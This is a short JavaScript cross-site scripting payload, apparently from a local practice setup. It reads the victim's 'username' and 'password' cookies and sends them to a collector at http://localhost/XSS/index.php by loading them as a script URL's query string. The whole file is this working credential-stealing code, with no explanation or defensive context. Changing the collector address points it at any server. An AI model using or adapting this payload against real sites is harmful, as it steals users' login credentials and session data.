
var script = document.createElement("script");
script.type="text/javascript";
script.src="jquery-2.2.0.js";


function getCookie(c_name) {
if (document.cookie.length>0)
  {
  c_start=document.cookie.indexOf(c_name + "=")
  if (c_start!=-1)
    { 
    c_start=c_start + c_name.length+1 
    c_end=document.cookie.indexOf(";",c_start)
    if (c_end==-1) c_end=document.cookie.length
    return unescape(document.cookie.substring(c_start,c_end))
    } 
  }
return ""
}



var username=getCookie('username');
var password=getCookie('password');
//alert(username);
var script =document.createElement('script');
script.src='http://localhost/XSS/index.php?username='+username+'&password='+password;

document.body.appendChild(script);
